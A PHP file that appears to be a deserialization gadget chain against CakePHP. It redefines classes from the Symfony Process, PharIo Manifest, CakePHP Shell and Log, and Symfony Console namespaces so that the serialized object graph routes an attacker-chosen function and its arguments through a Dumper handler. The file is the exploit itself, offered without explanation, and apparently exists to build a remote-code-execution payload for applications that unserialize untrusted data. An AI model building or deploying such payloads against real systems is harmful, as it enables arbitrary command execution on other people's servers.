<?php

namespace Symfony\Component\Process\Pipes
{   
    class UnixPipes
    {
        public $pipes;

        public function __construct($func, $args)
        {
            $this->pipes = new \PharIo\Manifest\ExtElementCollection($func, $args);
        }
    }
}

namespace PharIo\Manifest
{
    abstract class ElementCollection
    {
        private $nodeList;

        public function __construct($func, $args) 
        {
            $this->nodeList = new \App\Shell\ConsoleShell($func, $args);
        }
    }

    class ExtElementCollection extends ElementCollection
    {
        public function __construct($func, $args) 
        {
            parent::__construct($func, $args);
        }
    }
}

namespace App\Shell
{
    class ConsoleShell
    {
        public $taskNames;
        public $Tasks;
        protected $_taskMap;

        public function __construct($func, $args) 
        {
            $this->taskNames = ["length"];
            $this->_taskMap = ["length"=>["class"=>$args,"config"=>["className"=>new \Symfony\Component\Console\Helper\Dumper($func)]]];
            $this->Tasks = new \Cake\Log\LogEngineRegistry();
        }
    }
}

namespace Cake\Log
{
    class LogEngineRegistry
    {
        protected $_loaded=[];

        public function __construct()
        {
        }
    }
}

namespace Symfony\Component\Console\Helper
{
    class Dumper
    {
        private $handler;

        public function __construct($func)
        {
            $this->handler = $func;
        }
    }
}